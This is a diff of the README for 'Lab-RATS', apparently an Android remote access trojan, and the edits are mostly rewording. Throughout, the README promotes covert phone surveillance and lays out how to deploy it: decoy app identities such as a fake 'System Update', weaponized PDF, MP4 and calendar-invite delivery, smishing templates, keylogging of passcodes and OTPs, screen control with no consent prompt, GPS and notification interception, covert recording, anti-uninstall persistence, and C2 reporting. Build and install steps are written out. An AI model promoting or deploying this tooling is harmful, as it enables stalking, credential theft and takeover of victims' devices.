@@ -71,8 +71,7 @@ forwarding**, or **third-party tunneling services** like **Ngrok** or **Pinggy**
  />
 </p>
 
-### 💉 Payload Delivery Vectors: 
-*(Installing APK onto Target Device)*
+### 💉 APK Payload Delivery Vectors:
 - The **Weaponization Engine** has been **overhauled to support multiple high-success delivery methods** *(Stealth PDF, Zero-Click MP4, Meeting Invite and Many More)*, **ensuring reliable access** across **all modern mobile environments**.
 
 ### 🛡️ Evasion Engine:
@@ -85,7 +84,7 @@ analysts**.
 
 ### 🎭 Stealth App Decoys:
 **Remotely swap the entire Lab-RATS app identity and icon instantly** using **the 
-"Masquerade Library"** of convincing **Fully Functional Clones**:
+"Masquerade Library"** of **convincing, fully functional Clones**:
 - 👀 **System Update** *(Default)*: **Used for initial install** it **simulates a system update** and **prompts for permissions during the process**, achieving **highly successful installs**.
 - 🧮 **Calculator**: Performs **actual math** with a **tactical logic engine**.
 - 🌦️ **Weather App**: Displays **real-time localized forecasts** via **Open-Meteo API**.
@@ -115,7 +114,7 @@ names and codes** that **mimic legitimate system OTA updates**.
  />
 </p>
 
-### 👻 Ghost_Operations:
+### 👻 Ghost Operations:
 - **Ghost Control/Live Feed**: **Cast & Control the live screen remotely** with **NO "Consent Prompt" required**.
 - **Blackout Mode**: A 
 **high-stealth mode** designed to **physically mask the targets device display** while maintaining a **NON-masked live remote feed**. *(Pair with Ghost Control for maximum stealth)*
@@ -124,7 +123,7 @@ names and codes** that **mimic legitimate system OTA updates**.
 **render the device inoperable until hard-reset/restarted** or **unlocked remotely from the C2 dashboard**.
 - **Live Keylogging**: Intercept **keystrokes** and **system text in real-time**. Now features **Sensitive Info Highlighting** *(Passcodes, OTPs, Emails glow Red)* and **Deep Extraction** for **browser login info**.
 
-### 🧪 Exploit_Factory:
+### 🧪 Exploit Factory:
 - **NFC Proximity Vector**: Generate **binary NDEF payloads for physical tags**.
 - **QR Visual Vector**: Dedicated **high-density QR code generator** for independent URL delivery.
 - **Smishing Library**: Pre-configured **tactical phishing templates** with **automated C2 
@@ -135,9 +134,9 @@ link injection**.
 - **High-speed, event-driven protection** that **blocks attempts** to **Uninstall** or **Force Stop** the **app**.
 - **Suicide Protocol (Self-Destruct)**: **Remote-triggered persistent loop** that **wipes all local configuration** and initiates a **hard uninstallation of the C2 core**.
 
-### 🛰️ Precision GPS Tracking & Intel Stream *(Notification Sniffer)*:
-- **One-click uplink** to open the **devices exact real-time location** in **Google Maps**.
-- **Intercept every notification** *(WhatsApp, Telegram, RCS, System...etc)* in a **live feed**.
+### 🛰️ Live GPS Tracking & Intel Stream *(Sniffer)*:
+- **One-click uplink** to open the **devices exact real-time location** using **Google Maps**.
+- **Intercept every app notification** *(WhatsApp, Telegram, RCS, System...etc)* in a **live feed**.
 
 ### 📸 Tactical Surveillance Hub *(Ultra-Stability)*:
 - **Covert Recording**: **Stealthily record video without any user-facing activity**.
@@ -160,8 +159,7 @@ The **Terminal Tabs Built-in Shell has been overhauled** for **professional work
 - **Hardened I/O**: **Multi-stage retry logic** and **unique execution tracking** for **zero-latency command output**.
 
 ### 📊 Telemetry & Reporting:
-- **C2 Auto-Reporting**: **Discrete** reporting of **Date & Time, Device Make & Model, Connection Type *(WiFi/Cellular)*, IP Address, Port, Active C2 
-Dashboard Link, Battery %, Stealth Status, Charging Status, and Storage Space** to a centralized **Google Sheet or Render C2**.
+- **C2 Auto-Reporting**: **Discrete reporting** of **Date & Time, Device ID, Connection Type *(WiFi/Cellular)*, IP Address & Port, C2 Dashboard Link, Battery %, Stealth & Charge Status, and Device Storage** to a **centralized Google Sheet or Render C2**.
 
 ---
 
@@ -191,8 +189,8 @@ termux-reload-settings
  />
 </p>
 
-**Lab-RATS** supports **two 
-primary methods** for **tracking your device fleet** and **receiving remote data**.
+**Lab-RATS** supports **TWO 
+primary methods** to **track your device fleet**, and **remotely connect/receive data**
 
 ### ☝🏻 Option 1: Google Sheet *(Updated)*
 **Best for basic IP tracking** and **logging**. **No server maintenance required**.
@@ -298,13 +296,13 @@ environment meets the following requirements**:
 * **Python 3.x**: Required for **Option 7: Smali Surgery & APK Binder** *(`binder.py`)*.
 * **Gradle**: Handled automatically via the included `./gradlew` *(Gradle 8.10+)*.
 
-### 2. C2 Server Hosting Requirements: *(For Option 2: Render / Railway)*
+### 2. C2 Server Hosting Requirements: *(For Option 2: Render.com/Railway)*
 * **Node.js**: **v18.0.0** or higher.
 * **npm**: **v9.0.0** or higher.
 * **Render / Linux Hosting**: 512 MB RAM minimum *(Render Free Tier supported)*.
 
-### 3. Target Android Device Compatibility:
-* **Minimum OS**: **Android 5.0** *(Lollipop / API 21)* or **higher**.
+### 3. Android Device Compatibility:
+* **Minimum OS**: **Android 5.0** *(Lollipop/API 21)* or **higher**.
 * **Target OS**: **Android 14 - 16** *(API 34 - 36)* **fully supported**.
 * **Supported Devices**: **Samsung, Google Pixel, OnePlus, Xiaomi, Motorola, HTC, LG**, and **generic Android devices/
 emulators**.
@@ -322,7 +320,7 @@ emulators**.
 </p>
 
 ### 1. Building the APK (on PC)
-1.  **Download the Repository**: `git clone https://github.com/KAN3C0/Lab-RATS-v1.6.git`
+1.  **Download the Repository**: `git clone https://github.com/K4N3CO/Lab-RATS-v1.6.git`
 2.  **Navigate** to: `cd /Lab-RATS-v1.6/apk-builder/`
 3.  **Execute** the **Builder**:
     *   **Mac/Linux**: `chmod +x build.sh && ./build.sh`
@@ -337,7 +335,7 @@ emulators**.
 **Deployment** is **a multi-stage process** involving **Weaponization**, **Hosting**, and **Execution**.
 
 #### A. Strategic Weaponization: (The Wrapper)
-**Standard** `.apk` files are **often blocked by email filters and browser security**. Use the **Infection Chain Wizard** *(Option 6)* in the `apk-builder`tool to wrap your link inside a **high-compatibility carrier file**:
+**Standard** `.apk` files are **often blocked by email filters and browser security**. Use the **Infection Chain Wizard** *(Option 6)* in the `apk-builder`tool to **wrap your link inside a high-compatibility carrier file**:
 *   **📑 Stealth PDF (Highly Recommended)**: Send to **targets via Email or Drive**. It utilizes **URI Actions** instead of **JavaScript** to trigger an **automatic browser-based download, bypassing standard PDF security filters**.
 *   **🎬 Zero-Click MP4**: **Send as a video file**. It **exploits** mobile **Media Heap Overflows** during **gallery indexing or thumbnail generation** to **force-register the C2 link in the background**.
 *   **🗓️ Meeting Invite (ICS)**: Injects a **persistent event** into the **target's Calendar with automated reminders** and a **weaponized "Security Review" link**.
@@ -354,8 +352,8 @@ Once the **Target device** downloads the **APK**:
 1.  **Manual Sideload**: If you have **physical access to the device**, use `adb install signed.apk`
 2.  **Permissions (CRITICAL)**: **Open the app ONCE**. It will **prompt for necessary permissions** *(Camera, SMS, Files, etc)*.
     -  **Remote Permission Prompt**: If the **user skips some permissions**, you can **remotely trigger the system prompt again** from the **Ghost Tab** using the **REPAIR PERMISSIONS** button.
-3.  **Self-Vanishing**: A few seconds **after launch, the app will automatically replace its icon and name** with the **decoy you chose during build** *("System Update", "Calculator"...etc)*.
-4.  **Uplink Confirmation**: Check your **Google Sheet**. Within **5 seconds of initialization**, the **Device Make & Model, Connection Type, IP Address, Port, Active C2 Dashboard Link, Battery %, Stealth Status, Charging Status and Storage Space will appear in the log**.
+3.  **Self-Vanishing**: A **few seconds after launch**, the app will **automatically replace its icon and name** with the **decoy you chose during build** *("System Update", "Calculator"...etc)*.
+4.  **Uplink Confirmation**: Check your **Google Sheet or Render C2. Within 5 seconds of initialization**, the **Device ID, Connection Type, IP Address & Port, C2 Dashboard Link, Battery %, Stealth & Charging Status and Device Storage will appear in the log**.
 
 <details>
   <summary>📸 Click to View Google Sheet Reporting</summary>
@@ -441,7 +439,7 @@ https://github.com/user-attachments/assets/50296f14-6875-403a-8484-299a9628746d
 
 ---
 
-### 01. Terminal Tab:
+### 01. Home/Terminal Tab:
 
 <details>
   <summary>📸 Click to View Web Page Screenshot</summary>
@@ -452,7 +450,7 @@ https://github.com/user-attachments/assets/50296f14-6875-403a-8484-299a9628746d
 
 ---
 
-### 02. Ghost_Operations Tab:
+### 02. Ghost Operations Tab:
 
 <details>
   <summary>📸 Click to View Web Page Screenshot</summary>
